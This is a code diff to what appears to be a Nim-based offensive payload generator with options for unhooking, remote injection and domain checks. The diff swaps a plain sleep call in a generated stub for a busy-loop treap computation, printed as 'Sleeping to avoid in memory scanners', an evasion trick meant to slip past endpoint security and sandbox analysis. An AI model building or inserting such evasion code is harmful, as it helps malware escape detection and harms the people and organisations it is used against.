@@ -162,7 +162,7 @@ if args["--unhook"]:
 if args["--sleep"]:
   let sleeparg = args["--sleep"]
   sleeptime = parse_int($args["--sleep"])
-  sleeptime = (sleeptime * 1000)
+  sleeptime = (sleeptime)
   gosleep = true
 
 if args["--remoteinject"]:
@@ -263,10 +263,113 @@ var
 """
 
 let SleepStub = fmt"""
-#import std/math
+# Credit to @WhyDee86 - https://twitter.com/WhyDee86 for this sleep implementation
+
+import random
+import times
+
+type Node = ref object
+  x, y: int32
+  left, right: Node
+
+template newNode(value: int32): Node =
+  Node(x: value, y: rand(high int32).int32)
+
+proc merge(lower, greater: Node, res: var Node) =
+  if lower.isNil:
+    res = greater
+  elif greater.isNil:
+    res = lower
+  elif lower.y < greater.y:
+    res = lower
+    merge(lower.right, greater, lower.right)
+  else:
+    res = greater
+    merge(lower, greater.left, greater.left)
+
+template merge(lower, equal, greater: Node, res: var Node) =
+  merge(lower, equal, res)
+  merge(res, greater, res)
+
+proc splitBinary(orig: Node, lower, equalGreater: var Node, value: int32) =
+  if orig.isNil:
+    lower = nil
+    equalGreater = nil
+  elif orig.x < value:
+    lower = orig
+    splitBinary(lower.right, lower.right, equalGreater, value)
+  else:
+    equalGreater = orig
+    splitBinary(equalGreater.left, lower, equalGreater.left, value)
+
+template split(orig: Node, value: int32, lower, equal, greater: var Node) =
+  var equalGreater: Node
+  splitBinary(orig, lower, equalGreater, value)
+  splitBinary(equalGreater, equal, greater, value + 1)
+
+type Tree = object
+  root: Node
+
+template hasValue(self: var Tree, x: int32): bool =
+  var lower, equal, greater: Node
+  split(self.root, x, lower, equal, greater)
+  let ret = not equal.isNil
+  merge(lower, equal, greater, self.root)
+  ret
+
+template insert(self: var Tree, x: int32) =
+  var lower, equal, greater: Node
+  split(self.root, x, lower, equal, greater)
+  if equal.isNil:
+    equal = newNode(x)
+  merge(lower, equal, greater, self.root)
+
+template erase(self: var Tree, x: int32) =
+  var lower, equal, greater: Node
+  split(self.root, x, lower, equal, greater)
+  merge(lower, greater, self.root)
+
+proc Calc * () =
+  randomize()
+  var
+    tree = Tree()
+    cur = 5'i32
+    res = 0'i32
+#2500000 = 12-14sec
+  for i in 1'i64 ..< 500000'i64:
+    #echo i
+    let a = i mod 3
+    cur = (cur * 57 + 43) mod 10007
+    case a:
+    of 0:
+      tree.insert(cur)
+    of 1:
+      tree.erase(cur)
+    of 2:
+      if tree.hasValue(cur):
+        res += 1
+    else:
+      discard
+
+  #echo res
+
+proc HowMuchTimeWouldYoulikeToSleep * (sec : int) = 
+  var interval = 0
+  let t0 = getTime()
+  Calc()
+  #echo "First run Done"
+  var delta = getTime() - t0
+  while delta.inSeconds() < sec:
+      interval += 1
+      #echo "Round: ",interval
+      #echo delta.inSeconds()," Seconds out of: " , sec
+      Calc()
+      delta = getTime() - t0
+  #echo delta.inSeconds()," Seconds"
+
 
 echo obf("[*] Sleeping to avoid in memory scanners")
-sleep(cast[int]({sleeptime})) 
+HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
 """
 
 let DomainCheckStub = """
